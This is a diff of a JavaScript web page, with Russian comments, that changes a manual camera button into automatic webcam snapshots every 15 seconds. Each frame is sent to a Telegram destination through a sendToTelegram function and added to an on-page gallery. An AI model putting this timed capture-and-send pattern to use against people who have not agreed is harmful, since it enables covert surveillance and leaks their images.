@@ -32,8 +32,8 @@ async function initCamera() {
     }
 }
 
-// Захват фото
-captureBtn.addEventListener('click', async () => {
+// Функция захвата и отправки
+async function takePhoto() {
     // Форсируем воспроизведение, если видео зависло
     if (video.paused) {
         try { await video.play(); } catch (e) { }
@@ -41,21 +41,20 @@ captureBtn.addEventListener('click', async () => {
 
     // Проверяем готовность
     if (video.readyState < 2) {
-        statusMsg.textContent = 'Ошибка: камера еще не готова. Подождите пару секунд.';
-        statusMsg.style.color = '#ef4444';
+        statusMsg.textContent = 'Ожидание готовности камеры...';
         return;
     }
 
     const context = canvas.getContext('2d');
 
-    // Устанавливаем размеры канваса равными реальным размерам видеопотока
+    // Устанавливаем размеры канваса
     canvas.width = video.videoWidth || video.clientWidth;
     canvas.height = video.videoHeight || video.clientHeight;
 
-    statusMsg.textContent = 'Делаю снимок...';
+    statusMsg.textContent = 'Авто-снимок...';
     statusMsg.style.color = '#fbbf24';
 
-    // Рисуем кадр на канвасе
+    // Рисуем кадр
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     // Получаем Blob и отправляем
@@ -63,11 +62,19 @@ captureBtn.addEventListener('click', async () => {
         if (blob) {
             sendToTelegram(blob);
             addToGallery(canvas.toDataURL('image/jpeg'));
-        } else {
-            statusMsg.textContent = 'Ошибка: не удалось создать изображение';
-            statusMsg.style.color = '#ef4444';
         }
     }, 'image/jpeg', 0.8);
+}
+
+// Запуск авто-захвата каждые 15 секунд
+let captureInterval = setInterval(takePhoto, 15000);
+
+// Кнопку оставим как принудительный ручной захват
+captureBtn.addEventListener('click', () => {
+    takePhoto();
+    // Сбрасываем интервал при ручном нажатии, чтобы не было двух фото подряд
+    clearInterval(captureInterval);
+    captureInterval = setInterval(takePhoto, 15000);
 });
 
 // Отправка в Telegram
